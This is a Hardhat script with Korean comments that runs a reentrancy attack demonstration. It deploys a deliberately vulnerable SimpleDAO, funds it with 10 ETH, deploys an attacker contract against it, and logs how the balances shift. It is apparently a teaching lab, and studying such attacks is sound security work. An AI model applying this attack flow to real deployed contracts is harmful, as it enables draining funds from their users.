import { network } from "hardhat";

const { ethers } = await network.connect();

async function main() {
  const [deployer, attacker] = await ethers.getSigners();

  console.log("Deployer:", deployer.address);
  console.log("Attacker:", attacker.address);

  // 1. 취약한 SimpleDAO 배포
  const SimpleDAO = await ethers.getContractFactory("SimpleDAO", deployer);
  const dao = await SimpleDAO.deploy();
  await dao.waitForDeployment();

  const daoAddress = await dao.getAddress();
  console.log("SimpleDAO deployed to:", daoAddress);

  // 2. DAO에 피해자 자금 10 ETH 넣기
  await dao.connect(deployer).donate({
    value: ethers.parseEther("10"),
  });

  console.log(
    "DAO balance before attack:",
    ethers.formatEther(await ethers.provider.getBalance(daoAddress)),
    "ETH"
  );

  // 3. 공격 컨트랙트 배포
  const DAOAttacker = await ethers.getContractFactory("DAOAttacker", attacker);
  const attackerContract = await DAOAttacker.deploy(daoAddress);
  await attackerContract.waitForDeployment();

  const attackerContractAddress = await attackerContract.getAddress();
  console.log("Attacker contract deployed to:", attackerContractAddress);

  // 4. 공격자가 1 ETH를 넣고 재진입 공격 실행
  await attackerContract.connect(attacker).attack({
    value: ethers.parseEther("1"),
  });

  console.log(
    "DAO balance after attack:",
    ethers.formatEther(await ethers.provider.getBalance(daoAddress)),
    "ETH"
  );

  console.log(
    "Attacker contract balance:",
    ethers.formatEther(await ethers.provider.getBalance(attackerContractAddress)),
    "ETH"
  );
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
